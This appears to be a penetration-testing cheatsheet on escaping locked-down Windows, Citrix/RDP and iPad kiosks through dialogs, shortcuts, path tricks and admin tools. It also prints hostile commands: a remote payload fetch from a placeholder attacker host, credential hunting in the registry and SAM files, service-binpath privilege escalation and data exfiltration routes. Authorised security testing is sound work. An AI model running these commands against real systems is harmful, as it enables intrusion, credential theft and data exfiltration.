---
title: Kiosk Breakout - Cheatsheet
date: 2026-07-03
image: cover.png
tags: [Windows, Cheatsheet]
excerpt: A consolidated kiosk and restricted-desktop breakout cheatsheet covering Windows, Citrix, RDP/VDI and iPad. Command execution, dialog-box pivots, path-restriction bypasses, browser tricks, alternative execution, file transfer, credential hunting and privilege escalation, all in one reference.
---

# Kiosk Breakout - Cheatsheet

A kiosk, Citrix/RDS/VDI session or point-of-sale terminal is a locked-down environment meant to expose a single application while hiding the underlying operating system. A breakout is any technique that pivots from that single application back to the desktop, a shell, or the filesystem. This cheatsheet consolidates the common breakout vectors across Windows, Citrix/RDP and iPad.

## Methodology - What to Test First

**Common dialogs** are the options that save a file, open a file, select a font, pick a color, print, scan, import or export. Most of them expose full Explorer functionality, so any of these entry points is worth hunting for:

- Close / Close as
- Open / Open with
- Print
- Export / Import
- Search
- Scan

Once any dialog or file browser is reachable, check whether it lets you:

- Modify or create new files
- Create symbolic links
- Reach restricted areas of the filesystem
- Execute other applications

Most breakouts are only limited by creativity once a single dialog is open. The sections below are the building blocks.

## Command Execution

An `Open with` option, a file association, or a browsable path to an interpreter is often enough to execute commands.

### Windows

Useful shells and interpreters: `cmd.exe`, `command.com`, `powershell.exe`, `powershell_ise.exe`, `wt.exe` (Windows Terminal), `mmc.exe`, `at.exe`, `schtasks.exe`, `taskschd.msc`, `cscript.exe`, `wscript.exe`, `mshta.exe`, `regsvr32.exe`, `rundll32.exe`, `wmic.exe`, `msbuild.exe`, `installutil.exe`, `forfiles.exe`, `pcalua.exe`, `conhost.exe`, `explorer.exe`.

Living-off-the-land binaries that execute code or perform unexpected actions are catalogued at [LOLBAS](https://lolbas-project.github.io/).

A few high-value one-liners when only a Run box or address bar is available:

```powershell
# Execute via mshta (VBScript)
mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run(""cmd.exe"")(window.close)")

# Execute via mshta (remote HTA)
mshta http://ATTACKER/payload.hta

# Run a Sysinternals tool directly over WebDAV (no download needed)
\\live.sysinternals.com\tools\procexp.exe

# Spawn a shell from a scripting host
cscript //nologo shell.vbs
```

### Linux / *nix

Useful interpreters: `bash`, `sh`, `zsh`, `dash`. Binaries that can be abused for command execution and shell escapes are catalogued at [GTFOBins](https://gtfobins.github.io/).

## Gaining a Command Shell (Windows)

Gaining an interactive shell is usually the earliest big win, since it unlocks enumeration and privilege escalation. Common executables to aim for: `cmd.exe`, `COMMAND.COM`, `powershell.exe`, or any third-party admin/shell tool.

### Keyboard-driven

- `Windows + R` then type `cmd` (Run dialog, the simplest method)
- `Windows + X` opens the Power User menu (Windows 8+) with quick links to Terminal / PowerShell
- `CTRL + SHIFT + ESC` opens Task Manager
- `CTRL + ALT + DEL` reaches Task Manager via the security screen

### Filesystem access methods

- **File Explorer**: browse to `C:\Windows\System32\`, right-click `cmd.exe` and select **Open**
- **Drag-and-drop**: drag any file (even an invalid extension like `.txt`) onto `cmd.exe` to launch a prompt
- **Hyperlink**: navigate to `file:///c:/Windows/System32/cmd.exe` and open it from the browser's Downloads panel (`CTRL + J`)
- **Task Manager**: **File > Run new task** and enter `cmd`
- **Right-click > Open in Windows Terminal** (Windows 11) from any folder

### Task Manager

Task Manager (`taskmgr`) can spawn new processes through **File > Run new task**. It can be reached from the Start Menu, the `CTRL + ALT + DEL` splash page, or directly with `CTRL + SHIFT + ESC`.

### Task Scheduler

Some systems block `cmd.exe` directly but still allow scheduling it. Create a task through the command-line scheduler (`at.exe`) or the GUI (`taskschd.msc` / `schtasks.exe`) to run `cmd.exe` a minute in the future or at logon.

### PowerShell

Similar to `cmd.exe`, but with the added ability to call .NET features and assemblies, which makes it more flexible for post-exploitation.

### MSPaint binary creation (deprecated, up to Windows 7)

Because of the encoding used to write BMP files, carefully chosen RGB colors can dictate the raw bytes written to disk, letting you craft a tiny executable inside Microsoft Paint. This only works up to Windows 7, but it is a memorable trick.

1. Open `mspaint.exe` and set the canvas size to Width=6, Height=1 pixels
2. Zoom in to make pixel editing easier
3. With the color picker, set the six pixels left to right:

    ```
    1st: R: 10,  G: 0,   B: 0
    2nd: R: 13,  G: 10,  B: 13
    3rd: R: 100, G: 109, B: 99
    4th: R: 120, G: 101, B: 46
    5th: R: 0,   G: 0,   B: 101
    6th: R: 0,   G: 0,   B: 0
    ```

4. Save as 24-bit Bitmap (`*.bmp;*.dib`)
5. Change the extension from `.bmp` to `.bat` and run it

The resulting file contains the binary data needed to execute `cmd.exe`.

### FTP client

The built-in FTP client rarely yields a full shell, but when everything else is blocked it can browse the filesystem via `!dir` and transfer third-party tools. Other useful shell-out commands:

```
!whoami
!date
!ping 127.0.0.1
```

### Batch files and Windows Script Host

`.BAT` and `.CMD` files can execute commands when an interactive shell is blocked. `.BAT` is often disabled while the lesser-known `.CMD` extension is still allowed.

If `cscript.exe` or `wscript.exe` are available, Windows Script Host can run VBScript, VBA and JScript. A minimal VBScript that launches a shell:

```vbscript
set objApp = CreateObject("WScript.Shell")
objApp.Run "CMD C:\"
```

Save it as a `.VBS` file and double-click it, or pass it to `cscript.exe` / `wscript.exe`. Any other installed language (Python, Perl, PHP, Java via `java.exe` / `javac.exe`) can be abused the same way.

## Abusing Dialog Boxes

Once a Save / Open / Print dialog is open it behaves like a lightweight Explorer and becomes a pivot point.

### Creating new files

- **Batch files**: right-click > New > Text File > rename to `.BAT` (or `.CMD`) > edit > open
- **Shortcuts**: right-click > New > Shortcut > `%WINDIR%\system32` (or a specific binary like `%WINDIR%\System32\cmd.exe`)

### Exploring the filesystem

- Right-click a folder > **Open in new window** to spawn a fresh Explorer instance
- Right-click files/folders to explore context menus
- Click **Properties** on shortcuts, then **Open File Location** to expand navigation

### Save / Open dialog manipulation

- Use **Save as** / **Open** dialogs to navigate the filesystem
- Use **Print > print to file** (XPS/PDF) to open a save dialog
- Enter network paths such as `\\127.0.0.1\c$\Windows\System32\` to reach `cmd.exe`
- Right-click inside a folder or dialog and use **Open command window here** (`SHIFT + Right Click`, Vista and newer)

### Input box exploitation

- Try UNC paths in any input box: `\\attacker-pc\`, `\\127.0.0.1\c$`
- Enter root paths such as `C:\` in any input field
- Bypass file-type filters by entering `.*` or `.exe` in the **File name** box

## Bypassing Path Restrictions

On lightly hardened systems, browsing directly to an obvious directory like `C:\Windows\System32` may be blocked. Several indirect references get around this.

### Environment variables

Many environment variables resolve to useful paths and can be typed into address bars, dialogs and Run boxes:

| Variable | Variable | Variable |
| --- | --- | --- |
| %ALLUSERSPROFILE% | %APPDATA% | %CommonProgramFiles% |
| %COMMONPROGRAMFILES(x86)% | %COMPUTERNAME% | %COMSPEC% |
| %HOMEDRIVE% | %HOMEPATH% | %LOCALAPPDATA% |
| %LOGONSERVER% | %PATH% | %PATHEXT% |
| %ProgramData% | %ProgramFiles% | %ProgramFiles(x86)% |
| %PROMPT% | %PSModulePath% | %Public% |
| %SYSTEMDRIVE% | %SYSTEMROOT% | %TEMP% |
| %TMP% | %USERDOMAIN% | %USERNAME% |
| %USERPROFILE% | %WINDIR% |  |

`%COMSPEC%` is especially handy, as it resolves directly to `cmd.exe`.

### Protocol handlers

Protocols not tied to the kiosk application can open other software or file views:

```
about:   data:   ftp:   file:   mailto:   news:   res:   telnet:   view-source:
```

Modern Windows also exposes shell protocols worth testing: `search-ms:`, `ms-settings:`, `ms-availablenetworks:`, and browser-internal pages such as `edge://`, `chrome://` and Firefox `about:config`.

### Shell URIs

Typing these into an address bar or Run box opens an Explorer view of the target location:

- `shell:Administrative Tools`
- `shell:DocumentsLibrary`
- `shell:Libraries`
- `shell:UserProfiles`
- `shell:Personal`
- `shell:SearchHomeFolder`
- `shell:NetworkPlacesFolder`
- `shell:SendTo`
- `shell:Common Administrative Tools`
- `shell:MyComputerFolder`
- `shell:InternetFolder`
- `shell:Profile`
- `shell:ProgramFiles`
- `shell:System`
- `shell:ControlPanelFolder`
- `shell:Windows`
- `shell:::{21EC2020-3AEA-1069-A2DD-08002B30309D}` → Control Panel
- `shell:::{20D04FE0-3AEA-1069-A2D8-08002B30309D}` → My Computer
- `shell:::{208D2C60-3AEA-1069-A2D7-08002B30309D}` → My Network Places
- `shell:::{871C5380-42A0-1069-A2EA-08002B30309D}` → Internet Explorer

### UNC paths

UNC paths are frequently accepted even on well-hardened systems. Try reaching the local machine's administrative share:

```
\\127.0.0.1\c$\Windows\System32
```

### Symbolic links and shortcuts

Where creation is allowed, symbolic links and `.lnk` shortcuts can point past a restriction to a blocked binary or directory.

## Accessing the Filesystem from the Browser

Every path variation below is worth trying in an address bar, since parsing quirks mean one form may succeed where another fails:

| PATH | PATH | PATH | PATH |
| --- | --- | --- | --- |
| File:/C:/windows | File:/C:/windows/ | File:/C:/windows\ | File:/C:\windows |
| File:/C:\windows\ | File:/C:\windows/ | File://C:/windows | File://C:/windows/ |
| File://C:/windows\ | File://C:\windows | File://C:\windows/ | File://C:\windows\ |
| C:/windows | C:/windows/ | C:/windows\ | C:\windows |
| C:\windows\ | C:\windows/ | %WINDIR% | %TMP% |
| %TEMP% | %SYSTEMDRIVE% | %SYSTEMROOT% | %APPDATA% |
| %HOMEDRIVE% | %HOMESHARE% |  |  |

## Browser Tricks

Generic browser techniques that apply across kiosk deployments:

- Create a file dialog with JavaScript to reach the file explorer: `document.write('<input/type=file>')`
- Use `CTRL + O` to open a file dialog and `CTRL + S` to open a save dialog, both of which browse the filesystem
- Download a text file and choose **Open**, which typically launches Notepad
- The iKat kiosk toolkit provides ready-made breakout pages. Backup mirrors: [swin.es/k](http://swin.es/k/) and [ikat.kronicd.net](http://www.ikat.kronicd.net/)

### Internet Explorer tricks

- **Image Toolbar**: clicking an image shows a toolbar (top-left) offering Save, Print, Mailto, and **Open "My Pictures"** in Explorer. Requires the kiosk to be running Internet Explorer.
- **Address bar filesystem access**: enter paths such as `file://C:/windows`, `C:/windows/`, `%HOMEDRIVE%`, or `\\127.0.0.1\c$\Windows\System32`
- **Alternative navigation**: probe the Help, Search and Print menus, and any menu that opens a dialog box
- **Unassociated protocol exploitation**: enter a protocol with no registered handler (`irc://`, `ftp://`, `telnet://`, `mailto:`). When the **Open with** dialog appears, pick any installed program, which then launches with the URI as a parameter (and possibly extra arguments).

    Example - launching Firefox with a custom profile:

    1. Enter `irc://127.0.0.1 -P "Test"` in the address bar
    2. Select Firefox from the program list
    3. Firefox launches with the "Test" profile, potentially with weaker restrictions, equivalent to `firefox irc://127.0.0.1 -P "Test"`
- **Show file extensions** to make renaming payloads reliable: see [howtohaven.com](https://www.howtohaven.com/system/show-file-extensions-in-windows-explorer.shtml)

### Microsoft Edge

Modern Citrix/RDS/kiosk deployments increasingly ship Microsoft Edge instead of Internet Explorer. Misconfigurations expose several breakout surfaces.

**File and upload dialogs** rely on the standard Windows file picker, which can expose local profile folders, mapped network drives, redirected/shared locations and writable temp directories. This is one of the most common breakout points.

**Downloads bar and file handling** can reveal the Downloads directory, the real filesystem path, and **Show in Folder** / open-with-default-handler options. Where these are not controlled through WDAC/AppLocker, Citrix App Protection, or Edge Enterprise policies (for example `DownloadRestrictions`), users can interact with local folders beyond what was intended.

**Printing and print dialogs** (`CTRL + P`, **Microsoft Print to PDF**, **Save to PDF**) open file-save dialogs at system locations, carrying the same dialog-breakout risk as upload windows.

**Developer Tools (F12)** are more locked down than IE's, but when left enabled can still expose the DOM, network requests, the JavaScript console, and storage/cookies/local/session storage, letting a user manipulate the application, extract tokens, or modify page behaviour. They can be disabled through GPO or Citrix policy.

**Extensions, PWAs and add-ons**: Edge supports extensions, Progressive Web Apps, WebAssembly and background services. Uncontrolled extension installs can open paths to local file access, network tunnelling, clipboard monitoring, and code execution in the user context. Administrators should enforce `ExtensionInstallBlocklist`, `ExtensionInstallAllowlist` and `ExtensionInstallSources` through the Edge ADMX templates.

**Downloads and native handlers**: if a downloaded file can be opened by a default PDF reader, Office application, image viewer or script interpreter, the breakout surface widens. Restrict with WDAC/AppLocker, locked file associations, and by disabling **Open file after download** via Edge policy.

## Touchscreen / Swipe Breakouts

On touch-enabled kiosks, edge swipes can minimise the locked application and expose the OS:

- Swipe from the left edge to the right to see all open windows and reach the desktop
- Swipe from the right edge to the left to open the Action Center
- Swipe in from the top edge to reveal the title bar of a full-screen app
- Swipe up from the bottom edge to reveal the taskbar in a full-screen app

## Keyboard Shortcuts and Hotkeys

Where hardening is superficial (for example, only Start Menu links were removed), standard shortcuts can provide an escape.

### Standard Windows shortcuts

- `WINDOWS + F1` - Windows Search
- `WINDOWS + D` - Show Desktop
- `WINDOWS + E` - Launch Windows Explorer
- `WINDOWS + R` - Run
- `WINDOWS + U` - Ease of Access Center (launches On-Screen Keyboard, Magnifier, Narrator)
- `WINDOWS + F` - Search
- `WINDOWS + X` - Power User menu (Windows 8+)
- `WINDOWS + I` - Settings
- `WINDOWS + Tab` - Task View
- `WINDOWS + +` - Magnifier
- `SHIFT + F10` - Context Menu
- `CTRL + SHIFT + ESC` - Task Manager
- `CTRL + ALT + DEL` - Security / splash screen on newer Windows
- `F1` - Help
- `F3` - Search
- `F6` - Address Bar
- `F11` - Toggle full screen in Internet Explorer
- `CTRL + H` - Internet Explorer History
- `CTRL + T` - Internet Explorer New Tab
- `CTRL + N` - New Page / New window / New RDP-Citrix session
- `CTRL + O` - Open File
- `CTRL + S` - Save As
- `CTRL + B` - Favourites / Bookmarks
- `CTRL + I` - Favourites
- `CTRL + L` - Address bar focus
- `CTRL + P` - Print dialog

Hidden administrative menus have been observed on `CTRL + ALT + F8` and `CTRL + ESC + F9`.

### Accessibility shortcuts

These bring up pop-up dialogs that pivot into Windows Settings and, from there, Help and Explorer:

- Sticky Keys - press `SHIFT` 5 times
- Mouse Keys - `SHIFT + ALT + NUMLOCK`
- High Contrast - `SHIFT + ALT + PRINTSCN`
- Toggle Keys - hold `NUMLOCK` for 5 seconds
- Filter Keys - hold right `SHIFT` for 12 seconds

Accessibility executables worth reaching directly: `osk.exe` (On-Screen Keyboard, useful when no physical keyboard is available), `narrator.exe`, `magnify.exe`.

> **Note (accessibility backdoor):** where you can write to `System32`, replacing `sethc.exe` (Sticky Keys) or `utilman.exe` (Ease of Access) with `cmd.exe` yields a shell from the lock screen. This needs write access to a protected directory, so it is usually a post-escalation trick rather than an initial breakout.

### Detailed shortcut breakout methods

Throughout this section, three recurring "escape methods" are referenced:

- **Method 1** - reach Task Manager and use **File > Run new task**
- **Method 2** - reach any Explorer window and browse to a binary
- **Method 3** - reach a Help or Print dialog and pivot through **File > Open**, right-click **View Source**, or the **Find Printer** button

| Shortcut | Effect and escape |
| --- | --- |
| `ALT + TAB` | Switch between open programs; background software may offer an escape |
| `CTRL + ALT + DEL` | Security screen with Task Manager (Method 1) |
| `CTRL + SHIFT + ESC` | Opens Task Manager directly (Method 1) |
| `CTRL + B` | Bookmarks menu; right-click for an Explorer menu (Method 2) |
| `CTRL + ESC` | Opens Start menu (if Explorer is the shell) |
| `CTRL + F4` | Closes the current MDI window, revealing what is behind |
| `CTRL + P` | Print dialog; use **Find Printer**, Help, or right-click **View Source** (Method 3) |
| `CTRL + Tab` | May close/cycle windows or tabs, revealing what is behind |
| `CTRL + WINDOWS + F` | Find computer; opens an Explorer dialog (Method 2) |
| `F1` | Windows Help; classic help has File > Open, HTML help allows right-click View Source (Method 3) |
| `F3` | Windows search; another Explorer window (Method 2) |
| `SHIFT` x5 | Sticky Keys prompt, a few clicks from a Help dialog (Method 3) |
| `SHIFT + Right Click` | **Open command window here** on the Desktop, in a folder, or in a File Open/Save dialog (Vista+) |
| `WINDOWS + Break` (Pause) | System Properties dialog (Method 2) |
| `WINDOWS + D` | Minimise all windows, show the desktop |
| `WINDOWS + E` | Windows Explorer (Method 2) |
| `WINDOWS + F1` | Windows OS Help (Method 3) |
| `WINDOWS + R` | Run dialog |
| `WINDOWS + T` | Select an app on the taskbar, revealing what is behind |
| `WINDOWS + U` | Utility Manager; launch On-Screen Keyboard, then Help dialog, View Source, Notepad, find and open an EXE (Method 1/3) |
| `WINDOWS` | Start menu |

On a Microsoft keyboard with IntelliType installed, these may also open a Help dialog or Explorer window:

- `WINDOWS + P` - Print Manager
- `WINDOWS + C` - Control Panel
- `WINDOWS + V` - Clipboard
- `WINDOWS + K` - Keyboard Properties
- `WINDOWS + I` - Mouse Properties
- `WINDOWS + A` - Accessibility Options
- `WINDOWS + SPACEBAR` - list of IntelliType shortcut keys

### Sticky Keys for remote sessions

Sending combinations like `CTRL + SHIFT + ESC` over RDP/Citrix is tricky because the host OS often intercepts them. Sticky Keys makes this reliable:

1. Press `SHIFT` five times quickly. The Sticky Keys popup appears on both the host and the remote session.
2. Enable it on the remote OS (OK/Yes) but decline it on the host OS (Cancel/No).
3. Now press `CTRL` (release), `SHIFT` (release), `ESC` (release) to send `CTRL + SHIFT + ESC` only to the remote system.

The On-Screen Keyboard (`osk.exe`) is an alternative for remote testers, though not every combination works through it.

## Restricted Desktop Breakouts (Citrix / RDS / VDI)

- **Dialog-box pivoting**: use Open/Save/Print-to-file dialogs as a lightweight Explorer. Try `.*` / `.exe` in the filename field, right-click folders for **Open in new window**, and use **Properties > Open file location** to expand navigation.
- **Create execution paths from dialogs**: make a new file and rename it to `.CMD` / `.BAT`, or create a shortcut pointing to `%WINDIR%\System32` (or a specific binary such as `%WINDIR%\System32\cmd.exe`).
- **Shell launch pivots**: if you can browse to `cmd.exe`, drag-and-drop any file onto it to launch a prompt. If Task Manager is reachable (`CTRL + SHIFT + ESC`), use **Run new task**.
- **Task Scheduler bypass**: if interactive shells are blocked but scheduling is allowed, create a task to run `cmd.exe` (`taskschd.msc` or `schtasks.exe`).
- **Weak allowlists**: if execution is gated by filename/extension, rename your payload to a permitted name. If gated by directory, copy the payload into an allowed program folder and run it there.
- **Find writable staging paths**: start with `%TEMP%` and enumerate writable folders with Sysinternals AccessChk.

```bash
echo %TEMP%
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
```

If you gain a shell, pivot to the Windows privilege-escalation checklist: [Local Windows Privilege Escalation](https://hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html).

### RDP / Citrix hotkeys

Remote Desktop hotkeys:

- `CTRL + ALT + END` - Windows Security dialog
- `CTRL + ALT + BREAK` - toggle windowed / full-screen
- `ALT + INSERT` - cycle through windows
- `ALT + HOME` - Start menu
- `ALT + DELETE` - control / context menu
- `CTRL + ALT + NUMPAD MINUS` - screenshot active window to RDP clipboard
- `CTRL + ALT + NUMPAD PLUS` - screenshot entire session to RDP clipboard

Citrix ICA hotkeys:

- `SHIFT + F1` - Windows Task List
- `SHIFT + F2` - toggle title bar
- `SHIFT + F3` - close remote application / Citrix connection
- `CTRL + F1` - Windows NT Security desktop
- `CTRL + F2` - remote task list / Start Menu
- `CTRL + F3` - Task Manager
- `ALT + F2` - cycle maximised / minimised windows
- `ALT + PLUS` - cycle through open windows
- `ALT + MINUS` - cycle through open windows (reverse)

## Bypassing Write Restrictions

To stage third-party tools or save enumeration output, you need a writable location. Temporary folders almost always allow writes; find the default with `echo %TEMP%`. Common candidates:

- `C:\Users\USER\AppData\Local\Temp`
- `C:\temp\`
- `C:\tmp\`

Writing to `%USERPROFILE%` is another option, though it may redirect to a network share.

### AccessChk

Part of the Sysinternals Suite, similar to the built-in `cacls` / `icacls`. Use it to find directories that grant write access:

```
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
```

## Bypassing Executable Restrictions

- Some systems only allow applications with a specific filename or extension, which is often trivial to defeat by renaming `malware.exe` to an allowed value such as `mspaint.exe`.
- Others allow any application as long as it runs from an allowed directory. If Microsoft Word is permitted, copy your file into the same directory as `WINWORD.EXE` and run it there.

## Download Your Binaries

Portable tools worth staging once you have write access and a shell:

- Console: [sourceforge.net/projects/console](https://sourceforge.net/projects/console/)
- Explorer++: [sourceforge.net/projects/explorerplus](https://sourceforge.net/projects/explorerplus/files/Explorer%2B%2B/)
- Registry editor (uberregedit): [sourceforge.net/projects/uberregedit](https://sourceforge.net/projects/uberregedit/)

## Useful System and Administrative Tools

Default Windows admin tools are frequently overlooked during hardening. Most can be launched with the methods above:

- `MMC.exe` - Microsoft Management Console (broad control via snap-ins)
- `Mstsc.exe` - Terminal Services client (RDP to another host)
- `Regedit.exe` - Registry editor
- `Taskmgr.exe` - Task Manager
- `Control.exe` - Control Panel
- `Rundll32.exe` - access hidden OS areas via native API calls
- `Dxdiag.exe` - DirectX diagnostics (system info)
- `Msconfig.exe` - System configuration and links to system tools
- `Eventvwr.exe` - Event Viewer
- `Systeminfo.exe` - command-line system info
- `Msinfo32.exe` - System Information
- `Osk.exe` - On-Screen Keyboard
- `At.exe` - legacy Task Scheduler (deprecated on 10/11 in favour of `schtasks.exe`, still abusable if unblocked)
- `Taskschd.msc` - Task Scheduler GUI
- `Explorer.exe` - new Explorer instance
- `WMIC.exe` - Windows Management Instrumentation CLI (deprecated on Windows 11)
- `Qwinsta.exe` - RDP session info
- `Tasklist.exe` / `qprocess.exe` - process information

Hunt for other local Microsoft and third-party executables you can reach:

```
dir /s %WINDIR% *.exe
```

### RunDll32 commands

A large number of Control Panel applets and dialogs can be triggered through `rundll32`:

```
# Stored Usernames and Passwords
RunDll32.exe keymgr.dll,KRShowKeyMgr
# Control Panel
RunDll32.exe shell32.dll,Control_RunDLL
# Date and Time Properties
RunDll32.exe shell32.dll,Control_RunDLL timedate.cpl
# Device Manager
RunDll32.exe devmgr.dll DeviceManager_Execute
# Folder Options - General
RunDll32.exe shell32.dll,Options_RunDLL 0
# Forgotten Password Wizard
RunDll32.exe keymgr.dll,PRShowSaveWizardExW
# Keyboard Properties
RunDll32.exe shell32.dll,Control_RunDLL main.cpl @1
# Lock Screen
RunDll32.exe user32.dll,LockWorkStation
# Network Connections
RunDll32.exe shell32.dll,Control_RunDLL ncpa.cpl
# Open With dialog box
Rundll32 Shell32.dll,OpenAs_RunDLL FILE.ext
# Printer User Interface
Rundll32 Printui.dll,PrintUIEntry /?
# System Properties box
Rundll32 Shell32.dll,Control_RunDLL Sysdm.cpl,,3
# Windows Firewall
RunDll32.exe shell32.dll,Control_RunDLL firewall.cpl
# Windows About
RunDll32.exe SHELL32.DLL,ShellAboutW
```

### WMIC commands

WMIC is broad; a few useful information-gathering examples:

```
wmic share list /format:table                                    # local shares
wmic useraccount list full                                       # local users
wmic /output:c:\users.html useraccount list full /format:hform   # export users to HTML
wmic process list full                                           # processes
wmic service list full                                           # services
wmic product list full                                           # installed software
wmic os list full                                                # OS information
wmic qfe                                                         # installed patches / hotfixes
```

## Credentials and Juicy Data

### Default / weak credentials

There is always value in trying default or weak credentials. Enumerate valid usernames first where possible: watch for verbose error messages that distinguish "user does not exist" from "incorrect password", and use "forgot password" flows to confirm accounts. With a shell, run `net users` or `net users /domain`. Usernames commonly worth trying (and often reused as passwords):

- Test
- Citrixtest
- Administrator
- Admin
- Guest
- Backup
- Default

### Juicy files

Always scout for plaintext secrets. Search with Explorer, Windows Search, or the command line:

```
dir c:\ /s juicy.txt
dir c:\ /s *password* == *cred* == *vnc* == *.config*
```

Applications that commonly store credentials: VNC (`ultravnc.ini`), Apache (`httpd.conf`, `.htaccess`), KeePass and similar managers.

Interesting registry entries:

```
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
```

Files worth looking for:

```
sysprep.inf
sysprep.xml
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%USERPROFILE%\ntuser.dat
```

### Citrix ICAClient cached connections

Cached connection data often lives in the `ICAClient` directory under `%APPDATA%` (`dir /s ICAClient`). Copying another user's ICAClient contents into your own folder can hijack their stored connections.

### Group Policy Preferences (cPassword)

On a domain, if you can reach the `SYSVOL` share on the Domain Controller, hunt for the `cPassword` value inside these XML files:

- Groups.xml
- Services.xml
- ScheduledTasks.xml
- Printers.xml
- Drives.xml
- DataSources.xml

`cPassword` is AES-encrypted with a static key that Microsoft published, so it is trivially decryptable.

## Privilege Escalation - Binary Planting

Binary planting places attacker-controlled code where a vulnerable application or service will execute it. It usually depends on several weak configurations lining up.

### Weak Windows service permissions

Confirm which group you are in (a low-privilege user is usually in `Authenticated Users`), then enumerate services you can modify:

```
accesschk.exe -uwcqv "Authenticated Users" *
```

Many services run as SYSTEM, so write access to one grants SYSTEM-level execution:

```
sc config SERVICENAME binpath= "C:\WINDOWS\System32\cmd.exe /c C:\malicious.exe"
sc config SERVICENAME obj= ".\LocalSystem" password= ""
net stop SERVICENAME
net start SERVICENAME
```

### DLL hijacking

Windows searches a fixed order for a DLL. Placing a malicious DLL earlier in that order than the legitimate one gets your code loaded:

1. The directory from which the application loaded
2. 32-bit System directory (`C:\Windows\System32`)
3. 16-bit System directory (`C:\Windows\System`)
4. Windows directory (`C:\Windows`)
5. The current working directory (CWD)
6. Directories in the PATH environment variable (system then user)

## File Transfer - Getting Data In and Out

Methods for moving tools onto, and data off, the target:

- FTP
- HTTP servers (WAMP / LAMP / public file-hosting tools)
- SMB to your client: `\\hacker\tools`
- SMB to the server: `\\server\c$`
- DNS tunnelling
- Email (personal or corporate)
- Clipboard
- Streaming data via user input
- Device pass-through (RS232 / serial, USB)
- Bluetooth
- TeamViewer "run in memory" option

Most server-side methods are trivial to stand up, and Kali ships many of the required services ready to enable.

**DNS tunnelling**: even in highly restrictive environments, DNS queries often reach the internet, which can carry a tunnel. See PentestPartners' [iodine how-to](https://www.pentestpartners.com/security-blog/data-exfiltration-dns-tunnelling-using-iodine/).

**Email**: if a browser is available, webmail (Gmail, etc.) can move data in and out. Corporate email may work too, though attachment content filtering is common; wrapping data in an encrypted ZIP often bypasses it.

**Clipboard**: send data through the clipboard. Binary files can be base64-encoded and reconstructed on the remote side, or assembly copied over and assembled with `debug.exe`.

**Streaming via user input**: automate keyboard/mouse input to slowly stream data that is reconstructed on the other side. Reprogrammable HIDs such as a Rubber Ducky are ideal for this.

**Device pass-through**: RDP and Citrix Receiver can pass through local hardware (USB storage, serial ports). In `mstsc.exe`, use **Local Resources > More** to select devices and drives; in Citrix Workspace, use the **Devices** tab. A locally emulated serial port can stream data received server-side via HyperTerminal or a `debug.exe` receiver.

**Bluetooth**: on physical all-in-one devices, **Settings > Bluetooth & devices > Send or receive files via Bluetooth** can transfer files (not applicable to Citrix).

**TeamViewer**: the setup executable can run a standalone in-memory version without installing. Device-restriction solutions rarely flag non-malicious apps running in memory. If firewall rules permit, it then offers remote control, clipboard access and file transfer. The main constraint is getting the ~80MB setup binary onto the target, which is usually too large to email.

## iPad / iOS Kiosk

### Gestures and buttons

- Swipe up with four or five fingers, or double-tap Home, to view the multitasking view and switch apps
- Swipe left/right with four or five fingers to move to the next/previous app
- Pinch with five fingers, tap Home, or quick-swipe up from the bottom to reach Home
- Slow-swipe one finger up from the bottom 1-2 inches to reveal the dock
- Swipe down from the top with one finger to view notifications
- Swipe down from the top-right corner to open Control Center
- Swipe one finger from the left edge 1-2 inches to see Today view
- Fast-swipe one finger from the centre to the right or left to change apps
- Hold the On/Off/Sleep button (upper-right) and drag the power-off slider to power off
- Hold the On/Off/Sleep button and Home for a few seconds to force a hard power off
- Press the On/Off/Sleep button and Home quickly to take a screenshot

### Keyboard shortcuts

Requires an iPad or USB keyboard. Key names:

| Key | Name |
| --- | --- |
| ⌘ | Command |
| ⌥ | Option (Alt) |
| ⇧ | Shift |
| ↩ | Return |
| ⇥ | Tab |
| ^ | Control |
| ← | Left Arrow |
| → | Right Arrow |
| ↑ | Up Arrow |
| ↓ | Down Arrow |

System shortcuts (visual and sound settings):

| Shortcut | Action |
| --- | --- |
| F1 | Dim screen |
| F2 | Brighten screen |
| F7 | Back one song |
| F8 | Play / pause |
| F9 | Skip song |
| F10 | Mute |
| F11 | Decrease volume |
| F12 | Increase volume |
| ⌘ Space | Display available languages; tap Space again to choose |

iPad navigation:

| Shortcut | Action |
| --- | --- |
| ⌘H | Go to Home |
| ⌘⇧H | Go to Home |
| ⌘ Space | Open Spotlight |
| ⌘⇥ | List last ten used apps |
| ⌘~ | Go to the last app |
| ⌘⇧3 | Screenshot |
| ⌘⇧4 | Screenshot and open it in the editor |
| Press and hold ⌘ | List of shortcuts available for the app |
| ⌘⌥D | Bring up the dock |
| ^⌥H | Home button |
| ^⌥H H | Show multitask bar |
| ^⌥I | Item chooser |
| Escape | Back button |
| → | Next item |
| ← | Previous item |
| ↑↓ | Simultaneously tap selected item |
| ⌥↓ | Scroll down |
| ⌥↑ | Scroll up |
| ⌥← / ⌥→ | Scroll left or right |
| ^⌥S | Turn VoiceOver speech on or off |
| ⌘⇧⇥ | Switch to the previous app |
| ⌘⇥ | Switch back to the original app |
| ←+→, then ⌥← or ⌥→ | Navigate through the Dock |

Safari shortcuts:

| Shortcut | Action |
| --- | --- |
| ⌘L | Open Location |
| ⌘T | Open a new tab |
| ⌘W | Close the current tab |
| ⌘R | Refresh the current tab |
| ⌘. | Stop loading the current tab |
| ^⇥ | Switch to the next tab |
| ^⇧⇥ | Move to the previous tab |
| ⌘⇧T | Reopen the last closed tab |
| ⌘[ | Back one page |
| ⌘] | Forward one page |
| ⌘⇧R | Activate Reader Mode |

Mail shortcuts:

| Shortcut | Action |
| --- | --- |
